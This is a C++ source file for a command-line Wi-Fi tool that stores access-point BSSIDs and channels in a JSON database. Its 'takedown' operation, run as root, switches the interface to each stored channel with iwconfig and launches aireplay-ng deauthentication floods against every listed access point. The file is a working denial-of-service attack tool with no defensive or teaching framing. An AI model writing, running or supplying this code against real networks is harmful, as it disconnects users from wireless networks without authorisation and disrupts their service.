#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <unistd.h>
#include <sys/wait.h>
#include "nlohmann/json.hpp"
#include "../include/db.h"
using json = nlohmann::json;

int main(int argc, char* argv[]){
    if (argc < 3){
        std::cerr <<"Every function here has more than 1 argument." << std::endl;
        return 1;
    }
    std::string operation = argv[1];
    if (operation == "add"){
        if (argc < 5){
            std::cerr <<"add operation requires 3 arguments: bssid, channel and path to database file." << std::endl;
            return 1;
        }
        std::string bssid = argv[2];
        int channel = std::stoi(argv[3]);
        std::string path = argv[4];
        set_path(path);
        if (!exists_in_db(bssid)){
            std::cout << "Adding entry: " << bssid << " on channel " << channel << std::endl;
            add_entry(bssid, channel);
        } else {
            std::cout << "Entry already exists: " << bssid << std::endl;
        }
    } else if (operation == "remove"){
        if (argc < 4){
            std::cerr <<"remove operation requires 2 arguments: bssid and path to database file." << std::endl;
            return 1;
        }
        std::string bssid = argv[2];
        std::string path = argv[3];
        set_path(path);
        json j = load_bssid_database();
        remove_entry(bssid);
        std::cout << "Removed entry: " << bssid << std::endl;
    } else if (operation == "takedown"){
        if (geteuid() != 0) {
            std::cerr << "This program must be run as root!\n";
            return 1;
        }
        if (argc < 5){
            std::cerr <<"takedown operation requires 3 arguments: packet number, interface and database file." << std::endl;
            return 1;
        }
        std::string packet_number = argv[2];
        std::string interface = argv[3];
        std::string path = argv[4];
        set_path(path);
        json j = load_bssid_database();
        if (j.empty()){
            std::cerr << "Database is empty, nothing to takedown." << std::endl;
            return 1;
        }
        std::cout << j.size() << "\n";
        std::vector<pid_t> children;
        for (size_t i = 0; i < j.size(); i++) {
            std::string bssid = j[i]["bssid"].get<std::string>();
            int channel = j[i]["channel"].get<int>();

            // set channel
            pid_t pid = fork();
            if (pid == 0) {
                execlp("iwconfig", "iwconfig",
                    interface.c_str(), "channel",
                    std::to_string(channel).c_str(), nullptr);
                _exit(1);
            }
            waitpid(pid, nullptr, 0);

            // start attack
            pid = fork();
            if (pid == 0) {
                execlp("aireplay-ng", "aireplay-ng",
                    "--deauth", packet_number.c_str(),
                    "-a", bssid.c_str(),
                    interface.c_str(), nullptr);
                _exit(1);
            }

            sleep(3);

            // stop attack
            //kill(pid, SIGTERM);
            waitpid(pid, nullptr, 0);
        }
    }    

}
